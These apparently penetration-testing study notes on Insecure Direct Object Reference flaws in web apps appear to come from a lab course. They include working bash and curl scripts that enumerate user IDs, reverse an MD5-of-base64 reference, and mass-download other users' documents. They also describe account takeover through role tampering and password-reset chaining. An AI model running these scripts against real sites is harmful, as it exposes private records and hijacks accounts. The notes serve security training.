# Insecure Direct Object Reference (IDOR)
IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. If any user can access any resource due to the lack of a solid access control system, the system is considered to be vulnerable.

For example, if users request access to a file they recently uploaded, they may get a link to it such as (download.php?file_id=123). So, as the link directly references the file with (file_id=123), what would happen if we tried to access another file (which may not belong to us) with (download.php?file_id=124)?

## Identifying IDOR
### URL Parameters and APIs
- Look for URL parameters or API's (`?uid=1` or `?filename=file_1.pdf`) in the request
    - Try incrementing the parameter (if numerical). Example: `?uid=2` or `?filename=file_2.pdf`

### AJAX Calls
- Looking for functions in the front end code
    - Developers may put all of the functions in the front end code, but only surface the ones needed based on the users authorization level. However, the code will still remain and may be accessible.
Example Java Code:
```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```
The above function may never be called as a non-admin user, but if we find it in the front-end code, we may still be able to use it.

### Hashing/Encoding
- Some web apps may encode the object reference.
    In that case, we can attempt to decode it, change it, and then recode it to view the object.
- Some objects may hash the object reference.
    - Reviewing the source code of the site may reveal that the hashing function is buried in the front end, like the code below.
    ```javascript
    $.ajax({
        url:"download.php",
        type: "post",
        dataType: "json",
        data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
        success:function(result){
            //
        }
    });
    ```
    ### Compare User Roles
- Register multiple users and compare HTTP requests and object references.
- Example: 2 different users, one of them can view their salary after making the following API call.
```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```
- The 2nd user may not have all of these API parameters and shouldn't be able to make the same call as user 1. 
- We can try repeating the call with user 2 and see if the webapp returns anything.
- This will work if the webapp only requires a valid session to make the API call but has no access control on the backend to compare the callers session with the data being called.

## Mass IDOR Enumeration
![idor documents](/External/images/web_attacks_idor_documents.jpg)
*Example IDOR vulneerable website*

- Analyzing the page, we see several documents belonging to the user
```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```
- It looks like the app is using the `uid` parameter as part of the file name.
- Changing the `uid` parameter to '2', we see we have new file names:
```html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```
- Enumerating these manually will take forever, we need to automate
### Mass Enumeration
- Inspecting the code in firefox, we see the following html for the links:
```htmml
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```
- We could grep for the links, using curl
```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```
- A better plan might be to use a regex to isolate the actual url:
```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```
- Now we can use a bash `for` loop and wget to create a script to download all the files for all of the users
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```
*This script only works on employees 1-10. We'll need to adjust it for further use*

## Bypassing Encoded References
### Examples
![contracts.php](images/web_attacks_idor_contracts.jpg)
*Employee manager web application contracts*

![download.php](images/web_attacks_idor_download_contract.jpg)
*Employee manager contracts download.php*

### Enumeration
We see that the download functionality is sending a post request with the parameter:
```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```
- Function Disclosure
> Developers may make the mistake of making the obfuscation code available on the front-end. Looking at the source code of the page, we may find how the link hash is generated.
```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```
*Example obfuscation function*
- Code Analysis  
    Function appears to send a post request with the contract parameter. The value it sends is an md5 hash from CryptoJS. The value being hashed is a base64(btoa) encoded string of the UID variable. The UID is our previously discovered UID in the original IDOR. In this case, 1. So all this code does is MD5 the base64 hash of 1 (the UID).

We can test this with the following and seeing if our hashes line up.
```bash
echo -n 1 | base64 -w 0 | md5sum
```
> Note: Use `-n` and `-w` to avoiding adding newlines.

### Exploitation
Now that we've reversed the obfuscation, we can write another bash script to download everyones contract.
```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```
> Note: We use `tr -d` to remove the trailing " -"

Now we make a post request to actually download the files.
```bash
#! /bin/bash
for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -SOJ -X POST -d "contract=$hash" http://server_ip:port/download.php
    done
done
```

## IDOR in Insecure APIs
### Example Site
![idor_employee_manager](images/web_attacks_idor_employee_manager.jpg)
*Example Employee Manager*

![idor_edit_profile.jpg](images/web_attacks_idor_edit_profile.jpg)
*Example Employee Edit Profile*

### Enumeration
- Verify that any changes made persist through refreshes (Indicates they are stored in a db)
- Interecept the request
    ![idor_update_request](images/web_attacks_idor_update_request.jpg)
    *Intercepted update request*
    - Things to note from our intercepted request
        - Hidden Fields. Namely the `UID`,`UUID`, and `role` fields
        - Cookie defines our access level.
        - Using the `PUT` method to update
            - Note: `PUT` is often used to update fields, whereas `POST` is often used to create new, `DELETE` is used to delete, and `GET` to retrieve.

### Exploitation
- Things to try in this example:  
    - Change the UID
    - Change the UUID
    - Change the cookie to something like `admin`
    - Change the role to something like `admin`
    - Change the method to `POST` and see if we can create a new user

## Chaining IDOR Vulnerabilities
### Information Disclosure
- Using `GET` requests to gather information about Users
    - In this particular instance, identifying the roles so we can get admin
- Changing the email address and then sending a password reset request.

### Chaining 2 IDOR vulnerabilities.
- Example IDOR Enumeration Script
```bash
#!/bin/bash

for i in {1..20}; do
  curl -X GET http://94.237.120.233:58089//profile/api.php/profile/$i
  echo
done
```
